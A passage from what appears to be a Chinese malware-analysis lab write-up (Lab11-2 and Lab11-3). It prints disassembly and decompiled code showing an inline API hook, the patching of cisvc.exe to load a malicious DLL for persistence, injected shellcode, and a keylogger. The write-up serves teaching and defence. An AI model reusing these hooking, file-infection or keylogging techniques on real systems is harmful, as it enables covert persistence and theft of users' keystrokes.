flNewProtect</span><br><span class="line">.text:1000121B                 push    5               ; dwSize</span><br><span class="line">.text:1000121D                 mov     edx, [ebp+lpAddress]</span><br><span class="line">.text:10001220                 push    edx             ; lpAddress</span><br><span class="line">.text:10001221                 call    ds:VirtualProtect</span><br><span class="line">.text:10001227                 push    0FFh            ; Size</span><br><span class="line">.text:1000122C                 call    malloc</span><br><span class="line">.text:10001231                 add     esp, 4</span><br><span class="line">.text:10001234                 mov     [ebp+var_8], eax</span><br><span class="line">.text:10001237                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:1000123A                 mov     ecx, [ebp+lpAddress]</span><br><span class="line">.text:1000123D                 mov     [eax], ecx</span><br><span class="line">.text:1000123F                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:10001242                 mov     byte ptr [edx+4], 5</span><br><span class="line">.text:10001246                 push    5               ; Size</span><br><span class="line">.text:10001248                 mov     eax, [ebp+lpAddress]</span><br><span class="line">.text:1000124B                 push    eax             ; Src</span><br><span class="line">.text:1000124C                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:1000124F                 add     ecx, 5</span><br><span class="line">.text:10001252                 push    ecx             ; Dst</span><br><span class="line">.text:10001253                 call    memcpy</span><br><span class="line">.text:10001258                 add     esp, 0Ch</span><br><span class="line">.text:1000125B                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:1000125E                 mov     byte ptr [edx+0Ah], 0E9h</span><br><span class="line">.text:10001262                 mov     eax, [ebp+lpAddress]</span><br><span class="line">.text:10001265                 sub     eax, [ebp+var_8]</span><br><span class="line">.text:10001268                 sub     eax, 0Ah</span><br><span class="line">.text:1000126B                 mov     ecx, [ebp+var_8]</span><br><span class="line">.text:1000126E                 mov     [ecx+0Bh], eax</span><br><span class="line">.text:10001271                 mov     edx, [ebp+lpAddress]</span><br><span class="line">.text:10001274                 mov     byte ptr [edx], 0E9h</span><br><span class="line">.text:10001277                 mov     eax, [ebp+lpAddress]</span><br><span class="line">.text:1000127A                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:1000127D                 mov     [eax+1], ecx</span><br><span class="line">.text:10001280                 lea     edx, [ebp+flOldProtect]</span><br><span class="line">.text:10001283                 push    edx             ; lpflOldProtect</span><br><span class="line">.text:10001284                 mov     eax, [ebp+flOldProtect]</span><br><span class="line">.text:10001287                 push    eax             ; flNewProtect</span><br><span class="line">.text:10001288                 push    5               ; dwSize</span><br><span class="line">.text:1000128A                 mov     ecx, [ebp+lpAddress]</span><br><span class="line">.text:1000128D                 push    ecx             ; lpAddress</span><br><span class="line">.text:1000128E                 call    ds:VirtualProtect</span><br><span class="line">.text:10001294                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:10001297                 add     edx, 5</span><br><span class="line">.text:1000129A                 mov     eax, [ebp+arg_8]</span><br><span class="line">.text:1000129D                 mov     [eax], edx</span><br><span class="line">.text:1000129F                 mov     esp, ebp</span><br><span class="line">.text:100012A1                 pop     ebp</span><br><span class="line">.text:100012A2                 retn</span><br></pre></td></tr></table></figure>
+<p><strong>7.哪个文件或者哪些进程执行这个恶意攻击。为什么？</strong></p>
+<p>程序会对比当前进程名是否与<code>THEBAT.EXE</code>、<code>OUTLOOK.EXE</code>、<code>MSIMN.EXE</code>其中的任意一个相同，如果相同则运行恶意代码，否则退出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(Buf1, aThebatExe_0, v2)      <span class="comment">// THEBAT.EXE</span></span><br><span class="line">        || (v3 = <span class="built_in">strlen</span>(aOutlookExe), !<span class="built_in">memcmp</span>(Buf1, aOutlookExe_0, v3))<span class="comment">// OUTLOOK.EXE</span></span><br><span class="line">        || (v4 = <span class="built_in">strlen</span>(aMsimnExe), !<span class="built_in">memcmp</span>(Buf1, aMsimnExe_0, v4)) )<span class="comment">// MSIMN.EXE</span></span><br><span class="line">      &#123;</span><br><span class="line">        Proc_thread_sub_100013BD();</span><br><span class="line">        sub_100012A3(ModuleName, aSend, sub_1000113D, &amp;dword_10003484);</span><br><span class="line">        sub_10001499();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>8.<code>.ini</code>文件的意义是什么？</strong></p>
+<p>代码读取<code>.ini</code>文件中的数据，通过函数<code>sub_100010B3</code>进行解密得出一个邮箱地址<a href="mailto:`billy@malwareanalysisbook.com" target="_blank" rel="noopener">`billy@malwareanalysisbook.com</a>`。</p>
+<p><strong>9.你怎样使用WireShark动态抓取这个恶意代码的行为？</strong></p>
+<p>打开<code>WireShark</code>并用<code>outlook</code>发送邮件。</p>
+<h3 id="Lab11-3"><a href="#Lab11-3" class="headerlink" title="Lab11-3"></a>Lab11-3</h3><p><strong>分析恶意代码Lab11-03.exe和Lab11-03.dll。确保这两个文件在分析时位于同一个目录中。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.使用基础的静态分析过程，你可以发现什么有趣的线索？</strong></p>
+<p>在Lab11-03.exe中发现了一些有意思的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Address	Length	Type	String</span><br><span class="line">.rdata:004080E8	00000008	C	cmd.exe</span><br><span class="line">.rdata:004080F0	0000000C	C	command.com</span><br><span class="line">.rdata:00408100	00000008	C	COMSPEC</span><br><span class="line">.rdata:00408118	00000005	C	PATH</span><br><span class="line">.rdata:00408128	00000005	C	.exe</span><br><span class="line">.rdata:00408130	00000005	C	.bat</span><br><span class="line">.rdata:00408138	00000005	C	.cmd</span><br><span class="line">.data:00409139	00000024	C	C:\\WINDOWS\\System32\\inet_epar32.dll</span><br><span class="line">.data:0040915D	0000000C	C	zzz69806582</span><br><span class="line">.data:00409174	00000010	C	net start cisvc</span><br><span class="line">.data:00409184	00000017	C	C:\\WINDOWS\\System32\\%s</span><br><span class="line">.data:0040919C	0000000A	C	cisvc.exe</span><br><span class="line">.data:004091A8	0000000D	C	Lab11-03.dll</span><br><span class="line">.data:004091B8	00000024	C	C:\\WINDOWS\\System32\\inet_epar32.dll</span><br></pre></td></tr></table></figure>
+<p>Lab11-03.dll中的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.rdata:1000754C	00000008	C	H:mm:ss</span><br><span class="line">.rdata:10007554	00000014	C	dddd, MMMM dd, yyyy</span><br><span class="line">.rdata:10007568	00000007	C	M/d/yy</span><br><span class="line">.rdata:10007578	00000009	C	December</span><br><span class="line">.rdata:10007584	00000009	C	November</span><br><span class="line">.rdata:10007590	00000008	C	October</span><br><span class="line">.rdata:10007598	0000000A	C	September</span><br><span class="line">.rdata:100075A4	00000007	C	August</span><br><span class="line">.rdata:100075AC	00000005	C	July</span><br><span class="line">.rdata:100075B4	00000005	C	June</span><br><span class="line">.rdata:100075BC	00000006	C	April</span><br><span class="line">.rdata:100075C4	00000006	C	March</span><br><span class="line">.rdata:100075CC	00000009	C	February</span><br><span class="line">.rdata:100075D8	00000008	C	January</span><br><span class="line">.rdata:10007610	00000009	C	Saturday</span><br><span class="line">.rdata:1000761C	00000007	C	Friday</span><br><span class="line">.rdata:10007624	00000009	C	Thursday</span><br><span class="line">.rdata:10007630	0000000A	C	Wednesday</span><br><span class="line">.rdata:1000763C	00000008	C	Tuesday</span><br><span class="line">.rdata:10007644	00000007	C	Monday</span><br><span class="line">.rdata:1000764C	00000007	C	Sunday</span><br><span class="line">.rdata:10007670	00000016	C	SunMonTueWedThuFriSat</span><br><span class="line">.rdata:10007688	00000025	C	JanFebMarAprMayJunJulAugSepOctNovDec</span><br><span class="line">.rdata:1000785C	0000000D	C	KERNEL32.dll</span><br><span class="line">.rdata:100078A6	0000000B	C	USER32.dll</span><br><span class="line">.rdata:10007C82	0000000F	C	Lab1103dll.dll</span><br><span class="line">.rdata:10007C91	0000000C	C	zzz69806582</span><br><span class="line">.data:10008030	00000006	C	0x%x </span><br><span class="line">.data:10008038	00000009	C	&lt;SHIFT&gt; </span><br><span class="line">.data:10008044	00000008	C	%s: %s\n</span><br><span class="line">.data:1000804C	00000022	C	C:\\WINDOWS\\System32\\kernel64x.dll</span><br></pre></td></tr></table></figure>
+<p>程序导入了<code>GetAsyncKeyState</code>函数，因此可能是一个键盘窃听器。</p>
+<p><strong>2.当运行这个恶意代码时，发生了什么？</strong></p>
+<p>运行<code>ProcessMonitor</code>并运行这个恶意代码可以找出如下行为：</p>
+<ul>
+<li>程序将自身复制到<code>C:\\WINDOWS\\System32\\inet_epar32.dll</code></li>
+<li>对文件<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>进行写操作</li>
+<li>对文件<code>C:\\WINDOWS\\System32\\cisvc.exe</code>进行写操作</li>
+</ul>
+<p><strong>3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</strong></p>
+<p>将Lab11-03.exe加载到IDA中可以看到：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CHAR FileName; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;FileName, aCWindowsSystem_0, aCisvcExe);</span><br><span class="line">  sub_401070(&amp;FileName);</span><br><span class="line">  system(aNetStartCisvc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序先将<code>Lab11-03.dll</code>拷贝到<code>C:\WINDOWS\System32\inet_epar32.dll</code>，然后又打开了<code>cisvc.exe</code>的句柄，将此句柄作为函数 <code>sub_401070</code>的参数门之后又使用<code>net start cisvc</code>命令启动了<code>cisvc</code>服务，结合之前的分析我们可以猜测恶意代码对<code>cisvc</code>进行了修改，因此把分析的重点放到函数<code>sub_401070</code>上。</p>
+<p>从IDA为 <code>sub_401070</code>生成的伪c代码来看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401070</span><span class="params">(LPCSTR lpFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  DWORD dwMaximumSizeLow; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  HANDLE hFileMappingObject; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line">  _DWORD *lpBaseAddress; <span class="comment">// [esp+34h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = CreateFileA(lpFileName, <span class="number">0xC0000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  dwMaximumSizeLow = GetFileSize(hFile, <span class="number">0</span>);</span><br><span class="line">  hFileMappingObject = CreateFileMappingA(hFile, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, dwMaximumSizeLow, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( hFileMappingObject == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lpBaseAddress = MapViewOfFile(hFileMappingObject, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0</span>, dwMaximumSizeLow);</span><br><span class="line">    <span class="keyword">if</span> ( lpBaseAddress )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = lpBaseAddress + lpBaseAddress[<span class="number">15</span>];</span><br><span class="line">      v6 = sub_401000((v4 + *(v4 + <span class="number">20</span>) + <span class="number">24</span>), *(v4 + <span class="number">6</span>));</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v4 + <span class="number">40</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v6[<span class="number">4</span>] &gt; <span class="number">0x13A</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (v6[<span class="number">4</span>] - v6[<span class="number">2</span>]) &gt;= <span class="number">0x13A</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = v6[<span class="number">2</span>] + v6[<span class="number">5</span>];</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x13A</span>; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *(&amp;dword_409030 + i) == <span class="number">0x78</span></span><br><span class="line">                  &amp;&amp; *(&amp;dword_409030 + i + <span class="number">1</span>) == <span class="number">0x56</span></span><br><span class="line">                  &amp;&amp; *(&amp;dword_409030 + i + <span class="number">2</span>) == <span class="number">0x34</span></span><br><span class="line">                  &amp;&amp; *(&amp;dword_409030 + i + <span class="number">3</span>) == <span class="number">0x12</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  *(&amp;dword_409030 + i) = v6[<span class="number">5</span>] + *(v4 + <span class="number">40</span>) - *(v4 + <span class="number">44</span>) - (v3 + i + <span class="number">4</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              qmemcpy(lpBaseAddress + v3, &amp;dword_409030, <span class="number">0x13A</span>u);</span><br><span class="line">              *(v4 + <span class="number">40</span>) = *(v4 + <span class="number">44</span>) + v3 - v6[<span class="number">5</span>];</span><br><span class="line">              CloseHandle(hFile);</span><br><span class="line">              CloseHandle(hFileMappingObject);</span><br><span class="line">              UnmapViewOfFile(lpBaseAddress);</span><br><span class="line">              result = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              result = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">-1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        CloseHandle(hFileMappingObject);</span><br><span class="line">        UnmapViewOfFile(lpBaseAddress);</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CloseHandle(hFile);</span><br><span class="line">      CloseHandle(hFileMappingObject);</span><br><span class="line">      UnmapViewOfFile(<span class="number">0</span>);</span><br><span class="line">      result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数将文件<code>cisvc.exe</code>映射到内存之后对此文件进行了一些列的修改行为，但是由于代码又很多混淆，不容易进行静态分析，因此需要进行动态分析，载入OD中函数sub_401070下断点并进行单步调试，发现Lab11-03.exe会先查找<code>cisvc.exe</code>的PE头再查找到.text，然后在此位置有一个较为复杂的循环写值的操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:004011FF                 cmp     [ebp+var_20], 13Ah</span><br><span class="line">.text:00401206                 jnb     short loc_40127C</span><br><span class="line">.text:00401208                 mov     edx, [ebp+var_20]</span><br><span class="line">.text:0040120B                 xor     eax, eax</span><br><span class="line">.text:0040120D                 mov     al, byte ptr dword_409030[edx] ; shellcode</span><br><span class="line">.text:00401213                 cmp     eax, 78h</span><br><span class="line">.text:00401216                 jnz     short loc_401277</span><br><span class="line">.text:00401218                 mov     ecx, [ebp+var_20]</span><br><span class="line">.text:0040121B                 xor     edx, edx</span><br><span class="line">.text:0040121D                 mov     dl, byte ptr (dword_409030+1)[ecx]</span><br><span class="line">.text:00401223                 cmp     edx, 56h</span><br><span class="line">.text:00401226                 jnz     short loc_401277</span><br><span class="line">.text:00401228                 mov     eax, [ebp+var_20]</span><br><span class="line">.text:0040122B                 xor     ecx, ecx</span><br><span class="line">.text:0040122D                 mov     cl, byte ptr (dword_409030+2)[eax]</span><br><span class="line">.text:00401233                 cmp     ecx, 34h</span><br><span class="line">.text:00401236                 jnz     short loc_401277</span><br><span class="line">.text:00401238                 mov     edx, [ebp+var_20]</span><br><span class="line">.text:0040123B                 xor     eax, eax</span><br><span class="line">.text:0040123D                 mov     al, byte ptr (dword_409030+3)[edx]</span><br><span class="line">.text:00401243                 cmp     eax, 12h</span><br><span class="line">.text:00401246                 jnz     short loc_401277</span><br><span class="line">.text:00401248                 mov     ecx, [ebp+var_24]</span><br><span class="line">.text:0040124B                 mov     edx, [ecx+28h]</span><br><span class="line">.text:0040124E                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:00401251                 add     edx, [eax+14h]</span><br><span class="line">.text:00401254                 mov     ecx, [ebp+var_24]</span><br><span class="line">.text:00401257                 sub     edx, [ecx+2Ch]</span><br><span class="line">.text:0040125A                 mov     eax, [ebp+var_20]</span><br><span class="line">.text:0040125D                 mov     ecx, [ebp+var_28]</span><br><span class="line">.text:00401260                 lea     eax, [ecx+eax+4]</span><br><span class="line">.text:00401264                 sub     edx, eax</span><br><span class="line">.text:00401266                 mov     [ebp+var_30], edx</span><br><span class="line">.text:00401269                 mov     ecx, [ebp+var_20]</span><br><span class="line">.text:0040126C                 mov     edx, [ebp+var_30]</span><br><span class="line">.text:0040126F                 mov     dword_409030[ecx], edx</span><br><span class="line">.text:00401275                 jmp     short loc_40127C</span><br></pre></td></tr></table></figure>
+<p>修改前：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972de3c9b9f.png" alt=""></p>
+<p>修改后：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972df904409.png" alt=""></p>
+<p>使用HexCmp工具查看这两个二进制文件的区别（淡红色区域）：</p>
+<p><img src="https://i.loli.net/2019/03/24/5c972fa1d5de8.png" alt=""></p>
+<p>经过一步一步对比发现这些新的shellcode是位于<code>004011FF</code>的代码进行的，恶意代码对此文件的入口点进行了修改，由原来的<code>129B</code>修改为了<code>1A28</code>:</p>
+<p><img src="https://i.loli.net/2019/03/24/5c97323378bd9.png" alt=""></p>
+<p>在OD中打开修改后的文件<code>cisvc.exe</code>看到如下<code>shellcode</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01001B0A   .  FF55 FC       call dword ptr ss:[ebp-0x4]              ;  kernel32.LoadLibraryExA</span><br><span class="line">01001B0D   .  8945 F0       mov dword ptr ss:[ebp-0x10],eax          ;  inet_epa.10000000</span><br><span class="line">01001B10   .  8D83 24000000 lea eax,dword ptr ds:[ebx+0x24]</span><br><span class="line">01001B16   .  50            push eax                                 ;  inet_epa.10000000</span><br><span class="line">01001B17   .  8B45 F0       mov eax,dword ptr ss:[ebp-0x10]          ;  inet_epa.10000000</span><br><span class="line">01001B1A   .  50            push eax                                 ;  inet_epa.10000000</span><br><span class="line">01001B1B   .  FF55 F4       call dword ptr ss:[ebp-0xC]              ;  kernel32.GetProcAddress</span><br><span class="line">01001B1E   .  8945 F8       mov dword ptr ss:[ebp-0x8],eax           ;  inet_epa.10000000</span><br><span class="line">01001B21   .  FF55 F8       call dword ptr ss:[ebp-0x8]</span><br><span class="line">01001B24   .  89EC          mov esp,ebp</span><br><span class="line">01001B26   .  5D            pop ebp</span><br><span class="line">01001B27   .^ E9 6FF7FFFF   jmp cisvc.0100129B</span><br></pre></td></tr></table></figure>
+<p><code>cisvc.exe</code>现时使用<code>LoadLibrary</code>函数将<code>C:\WINDOWS\System32\inet_epar32.dll</code>加载到内存中然后获取导出函数<code>zzz69806582</code>的地址并执行此函数，之后在跳转到正常的程序入口点，从而使恶意代码达到长期驻留的目的。</p>
+<p><strong>4.这个恶意代码感染Windows系统的哪个文件？</strong></p>
+<p><code>cisvc.exe</code></p>
+<p><strong>5.Lab11-03.dll做了什么？</strong></p>
+<p>名为的导出函数<code>zzz69806582</code>创建了一个线程，我们集中分析这个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">zzz69806582</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数会创建一个<code>MZ</code>的互斥量:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset Name     ; &quot;MZ&quot;</span><br><span class="line">push    0               ; bInheritHandle</span><br><span class="line">push    1F0001h         ; dwDesiredAccess</span><br><span class="line">call    ds:OpenMutexA</span><br></pre></td></tr></table></figure>
+<p>将<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>加载到内存中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push    0</span><br><span class="line">push    80h             ; dwFlagsAndAttributes</span><br><span class="line">push    4               ; dwCreationDisposition</span><br><span class="line">push    0               ; lpSecurityAttributes</span><br><span class="line">push    1               ; dwShareMode</span><br><span class="line">push    0C0000000h      ; dwDesiredAccess</span><br><span class="line">push    offset FileName ; &quot;C:\\WINDOWS\\System32\\kernel64x.dll&quot;</span><br><span class="line">call    ds:CreateFileA</span><br></pre></td></tr></table></figure>
+<p>将文件指针指向<code>C:\\WINDOWS\\System32\\kernel64x.dll</code>的末尾：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    2</span><br><span class="line">push    0               ; lpDistanceToMoveHigh</span><br><span class="line">push    0               ; lDistanceToMove</span><br><span class="line">mov     eax, [ebp+hFile]</span><br><span class="line">push    eax             ; hFile</span><br><span class="line">call    ds:SetFilePointer</span><br></pre></td></tr></table></figure>
+<p>循环调用函数<code>sub_10001380</code>进行键盘敲击记录：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_10001380</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+4h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+8h] [ebp-400h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( !sub_10001030(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;Buffer, aSS, a1 + <span class="number">4</span>, a1 + 